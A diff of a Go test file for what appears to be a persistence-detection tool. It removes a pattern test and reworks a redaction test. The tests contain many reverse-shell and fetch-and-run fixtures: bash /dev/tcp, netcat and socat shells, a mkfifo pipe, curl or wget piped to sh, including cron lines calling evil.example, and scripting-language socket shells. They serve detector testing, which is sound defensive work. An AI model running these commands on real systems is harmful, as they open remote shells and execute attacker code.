@@ -7,70 +7,13 @@ import (
 	"testing"
 
 	"github.com/donaldsteele/telltale/internal/model"
+	"github.com/donaldsteele/telltale/internal/persistsig"
 	"github.com/donaldsteele/telltale/internal/redact"
 )
 
-func TestPersistCallbackPatterns(t *testing.T) {
-	hits := []string{
-		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
-		`exec 3<>/dev/udp/10.0.0.1/53`,
-		`sh -i >& /dev/null 0>&1`,
-		`/bin/bash -i 2>&1 | nc 10.0.0.1 4444`,
-		`nc -e /bin/sh 10.0.0.1 4444`,
-		`ncat --exec /bin/bash 10.0.0.1 4444`,
-		`/usr/bin/netcat -lvp 4444 -c bash`,
-		`NC.TRADITIONAL -e /bin/sh h 1`,
-		`socat TCP:10.0.0.1:4444 EXEC:/bin/sh,pty,stderr`,
-		`socat tcp-connect:h:1 system:'sh -i'`,
-		`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f`,
-		`curl -s http://x.example/a.sh | sh`,
-		`curl -fsSL http://x.example/a.sh | sudo bash`,
-		`wget -qO- http://x.example/a | /bin/bash -s`,
-		`sh -c "$(curl -fsSL http://x.example/a)"`,
-		"bash -c \"`wget -qO- http://x/a`\"",
-		`bash <(curl -s http://x.example/a)`,
-		`eval "$(curl -s http://x.example/a)"`,
-		`echo cGF5bG9hZA== | base64 -d | sh`,
-		`base64 --decode /tmp/p | bash`,
-		`python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("h",1));subprocess.call(["/bin/sh"])'`,
-		`python -c "import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn('sh')"`,
-		`perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec("/bin/sh -i")'`,
-		`ruby -rsocket -e 'c=TCPSocket.new("h",1);exec "/bin/sh"'`,
-		`php -r '$s=fsockopen("h",1);exec("/bin/sh -i <&3");'`,
-		`* * * * * root curl -s http://x.example/a | sh`,
-	}
-	for _, l := range hits {
-		if !callbackLine(l) {
-			t.Errorf("no hit: %s", l)
-		}
-	}
-	misses := []string{
-		`curl -o /tmp/x https://example.com/file.tar.gz`,
-		`wget -q https://example.com/list.txt -O /var/lib/list`,
-		`nc -z host 22`,
-		`nc -vz host 22`,
-		`curl -s https://example.com/health | shasum -a 256`,
-		`curl -s https://example.com/x | shuf -n1`,
-		`bash -c 'echo hello'`,
-		`sh -i`,
-		`socat TCP-LISTEN:8080,fork TCP:localhost:80`,
-		`echo cGF5 | base64 -d > /tmp/p`,
-		`base64 /etc/hostname`,
-		`python3 -c 'print(1)'`,
-		`python3 /usr/lib/app/socket_check.py`,
-		`python3 -c 'import socket; print(socket.gethostname())'`,
-		`mkfifo /tmp/f`,
-		``,
-	}
-	for _, l := range misses {
-		if callbackLine(l) {
-			t.Errorf("false hit: %s", l)
-		}
-	}
-}
-
 func persistFile(path, kind string, lines ...string) model.PersistFile {
-	return model.PersistFile{Path: path, Kind: kind, Mode: 0o100644, Lines: lines}
+	// Signals come from the raw lines, as the collector computes them.
+	return model.PersistFile{Path: path, Kind: kind, Mode: 0o100644, Lines: lines, Signals: persistsig.Detect(kind, lines)}
 }
 
 func callbackFindings(t *testing.T, pf model.PersistFile) []model.Finding {
@@ -153,31 +96,6 @@ func evidenceText(f model.Finding) string {
 		b.WriteString(e.Detail + " " + e.After + " ")
 	}
 	return b.String() + f.Title + f.Why
-}
-
-func TestPersistCallbackRedactedLineStillHits(t *testing.T) {
-	key := []byte("0123456789abcdef0123456789abcdef")
-	var lines []string
-	red := 0
-	for _, l := range []string{
-		`Environment="API_TOKEN=abc123456789" MODE=prod`,
-		`ExecStart=/bin/bash -c 'exec 3<>/dev/tcp/sink/4444' --password=hunter2`,
-	} {
-		r, n := redact.Line(key, l)
-		red += n
-		lines = append(lines, r)
-	}
-	if red < 2 || strings.Contains(strings.Join(lines, "\n"), "abc123456789") || !strings.Contains(lines[0], "<redacted") {
-		t.Fatalf("test setup: nothing redacted: %q", lines)
-	}
-	fs := callbackFindings(t, persistFile("/etc/systemd/system/e.service", model.PersistKindSystemdUnit, lines...))
-	if len(fs) != 1 || fs[0].Evidence[0].Line != 2 || !strings.Contains(fs[0].Evidence[0].After, "<redacted") {
-		t.Fatalf("redacted unit: %+v", fs)
-	}
-	// the redacted Environment= line on its own is no callback
-	if fs := callbackFindings(t, persistFile("/etc/systemd/system/f.service", model.PersistKindSystemdUnit, lines[0], "ExecStart=/usr/bin/true")); len(fs) != 0 {
-		t.Errorf("Environment line flagged: %v", keys(fs))
-	}
 }
 
 func TestPersistCallbackContinuationLines(t *testing.T) {
@@ -336,4 +254,42 @@ func TestUnownedCapabilityFile(t *testing.T) {
 		model.FileEntry{Path: "/usr/local/sbin/helper", Type: "file", Mode: 0o104755})
 	want(t, c, "heur.unowned_setuid:/var/tmp/.s", model.SevBackdoor)
 	want(t, c, "heur.unowned_setuid:/usr/local/sbin/helper", model.SevNote)
+}
+
+// redactedFile builds a persistence file the way the collector does: signals
+// from the raw lines, kept lines redacted.
+func redactedFile(path, kind string, raw ...string) model.PersistFile {
+	key := []byte("0123456789abcdef0123456789abcdef")
+	pf := model.PersistFile{Path: path, Kind: kind, Mode: 0o100644, Signals: persistsig.Detect(kind, raw)}
+	for _, l := range raw {
+		r, n := redact.Line(key, l)
+		pf.Lines = append(pf.Lines, r)
+		pf.Redactions += n
+	}
+	return pf
+}
+
+func TestPersistCallbackRedactedLineStillHits(t *testing.T) {
+	// A query string or a secret-like key swallows the rest of the line in
+	// the kept text; the signal was taken from the raw text.
+	for _, raw := range []string{
+		`* * * * * root curl -s http://evil.example/a?a=1&token=abc123 | sh`,
+		`* * * * * root curl -s 'http://evil.example/a?key=abc123' | bash`,
+		`* * * * * root SECRET=hunter2 /bin/bash -c 'exec 3<>/dev/tcp/h/4444'`,
+	} {
+		pf := redactedFile("/etc/cron.d/q", model.PersistKindCron, "SHELL=/bin/sh", raw)
+		if pf.Redactions == 0 || strings.Contains(pf.Lines[1], "| sh") && strings.Contains(raw, "token=") {
+			t.Fatalf("test setup: line not redacted as expected: %q", pf.Lines[1])
+		}
+		fs := callbackFindings(t, pf)
+		if len(fs) != 1 || fs[0].Evidence[0].Line != 2 || !strings.Contains(fs[0].Evidence[0].After, "<redacted") || strings.Contains(fs[0].Evidence[0].After, "abc123") {
+			t.Errorf("%s: %+v", raw, fs)
+		}
+	}
+	// Environment= values are redacted and never executed: no callback
+	u := redactedFile("/etc/systemd/system/f.service", model.PersistKindSystemdUnit,
+		`Environment="API_TOKEN=abc123456789" MODE=prod`, "ExecStart=/usr/bin/true")
+	if fs := callbackFindings(t, u); len(fs) != 0 {
+		t.Errorf("Environment line flagged: %v", keys(fs))
+	}
 }
